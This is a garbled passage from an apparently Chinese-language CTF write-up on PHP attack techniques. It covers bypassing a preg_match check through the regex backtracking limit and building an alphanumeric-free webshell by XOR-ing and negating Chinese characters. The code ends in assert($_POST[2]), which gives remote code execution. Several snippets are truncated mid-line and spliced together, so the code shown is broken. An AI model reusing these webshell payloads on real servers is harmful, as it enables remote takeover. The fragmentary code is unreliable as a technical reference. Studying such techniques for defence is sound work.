    move_uploaded_file($_FILES['file']['tmp_name'], $path);
    header("Location: $path", true, 303);
     }
**payload：**
    import requests
    from io import BytesIO
    files = {
    'file': BytesIO(b'aaa].*/is',
$data);`为false，根据preg_match函数的性质，
如果匹配不到或者`$data`为数组，那么返回为false。当然数组是不可能的，因为file_get_contents函数是将内容读入$data中，
那么就考了匹配不了这种情况，因为上面我们发现，当超过最好回溯限制式将返回false，因为利用这一个点进行突破。
### 使用无字母数字方式绕过
这是以一个题目引发的，之前看过P师傅的[讲解](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)，
很是收益。先膜一波，然后具体地解析一下代码。
     $p){
        echo $p^'`';
    }
**OUT:**
`0/34`
可以发现'P''S''T'这三个字母异或出来是数字，所以与']'异或一下，最终为：
**IN:**
    '>''>'';
    echo urlencode("和").'';
**OUT:**
    e5928c
    %E5%92%8C
可以发现utf-8编码与与Url编码的关系，了解了这些后，针对于怎么得到payload写了如下程序：
**IN:**
    ';
        }
        return $found;
    }
    $fuzz = array('和','看','的','加','徐','不','瞰','始','俯','站','次','半');
    var_dump(find_unicode($fuzz,get_unicode()));
**OUT:**
`array(9) { [0]=> string(3) "瞰" [1]=> string(3) "和" [2]=> string(3) "的" [3]=>
string(3) "不" [4]=> string(3)`
`"看" [5]=> string(3) "俯" [6]=> string(3) "瞰" [7]=> string(3) "次" [8]=>
string(3) "站" }`
找到需要是要的汉字，开始后构造payload(payload在开头已经给出了，简单说一下自己的理解)：
    '>''>'<');
    // 这里是true+true=2
    $_=$__/$__;
    // 这里2/2=1
    $___="瞰";$____.=~($___{$_});
    // 获得'a'字母
    $_=$$_____;
    // $_____为连接而成的'_POST'，$_为$_ POST
    $____($_[$__]);
    // 最终为assert($_POST[2])
以上有错误的地方希望，各位师傅能够指正(Ths)